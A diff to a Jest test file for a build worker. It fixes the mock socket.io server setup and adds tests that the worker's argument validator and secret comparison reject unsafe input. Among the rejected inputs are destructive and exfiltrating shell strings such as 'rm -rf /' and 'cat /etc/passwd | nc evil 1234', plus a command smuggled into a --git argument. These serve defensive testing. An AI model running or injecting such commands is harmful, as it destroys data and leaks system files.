@@ -31,10 +31,18 @@ describe("Worker", () => {
         secret: process.env.WORKER_SECRET || null
     };
 
+    // Mock API-side handler stub: the real API parses the worker's register
+    // message here; for the mock we only need it to not throw.
+    function parseSocketMessage(_socket, _msg) { /* no-op mock */ }
+
     beforeAll((done) => {
+        that.workers = {};
         const httpServer = createServer();
         io = new Server(httpServer);
-        httpServer.listen(() => {
+        // Must listen on server_port (4000) so the worker, which connects to
+        // http://localhost:4000, actually reaches this mock server and populates
+        // that.serverSocket via the connection handler below.
+        httpServer.listen(server_port, () => {
             //const port = httpServer.address().port;
         });
         io.on("connection", (socket) => {
@@ -96,6 +104,9 @@ describe("Worker", () => {
     });
 
     afterAll(() => {
+        // Close the worker's live client socket so it stops reconnecting and does not
+        // leak an open handle (otherwise `jest --detectOpenHandles` hangs at exit).
+        if (typeof (w) !== "undefined" && w && w.socket) w.socket.close();
         if (typeof (io) !== "undefined") io.close();
     });
 
@@ -178,14 +189,62 @@ describe("Worker", () => {
         expect(safe).toBe(true);
     });
 
+    test('isArgumentSafe accepts legitimate build arguments', () => {
+        expect(w.isArgumentSafe("--git=https://github.com/owner/repo.git")).toBe(true);
+        expect(w.isArgumentSafe("--branch=main")).toBe(true);
+        expect(w.isArgumentSafe("./builder --owner=mock --build_id=abc-123")).toBe(true);
+    });
+
+    test('isArgumentSafe rejects shell metacharacters', () => {
+        expect(w.isArgumentSafe("echo hello; rm -rf /")).toBe(false);
+        expect(w.isArgumentSafe("echo hello && whoami")).toBe(false);
+        expect(w.isArgumentSafe("echo `whoami`")).toBe(false);
+        expect(w.isArgumentSafe("echo $(whoami)")).toBe(false);
+        expect(w.isArgumentSafe("cat /etc/passwd | nc evil 1234")).toBe(false);
+        expect(w.isArgumentSafe("echo hi > /tmp/x")).toBe(false);
+        expect(w.isArgumentSafe(undefined)).toBe(false);
+    });
+
+    test('secretsMatch is exact and rejects prefixes', () => {
+        expect(w.secretsMatch("s3cr3t", "s3cr3t")).toBe(true);
+        expect(w.secretsMatch("s3cr3t-extra", "s3cr3t")).toBe(false); // prefix must NOT pass
+        expect(w.secretsMatch("s3cr3", "s3cr3t")).toBe(false);
+        expect(w.secretsMatch("wrong", "s3cr3t")).toBe(false);
+        expect(w.secretsMatch(null, "s3cr3t")).toBe(false);
+    });
+
+    test('runShell releases running guard on invalid build_id (no deadlock)', () => {
+        w.running = true;
+        w.runShell("echo hello", owner, "invalid id!", udid, path, io);
+        expect(w.running).toBe(false);
+    });
+
+    test('runShell releases running guard on unsafe --git argument (no deadlock)', () => {
+        w.running = true;
+        w.runShell("--git=http://x;rm -rf /", owner, build_id, udid, path, io);
+        expect(w.running).toBe(false);
+    });
+
     test ('runShell', (done) => {
         w.runShell(CMD, owner, build_id, udid, path, io, () => {
             done();
         });
     });
 
-    test('socket must be closed/disconnected at the end', () => {
-        w.close();
+    test('socket must be closed/disconnected at the end', async () => {
+        // The worker connects asynchronously; wait until the connection handler has
+        // stored the server-side socket in that.serverSocket (up to ~2s).
+        await new Promise((resolve, reject) => {
+            let waited = 0;
+            const tick = setInterval(() => {
+                if (that.serverSocket) { clearInterval(tick); resolve(); }
+                else if ((waited += 25) >= 2000) { clearInterval(tick); reject(new Error("worker never connected to mock server")); }
+            }, 25);
+        });
+        expect(typeof that.serverSocket).toBe("object");
+        // A server-side socket.io Socket has no close(); disconnect(true) tears down
+        // the socket and its underlying connection.
+        that.serverSocket.disconnect(true);
     });
 
 });
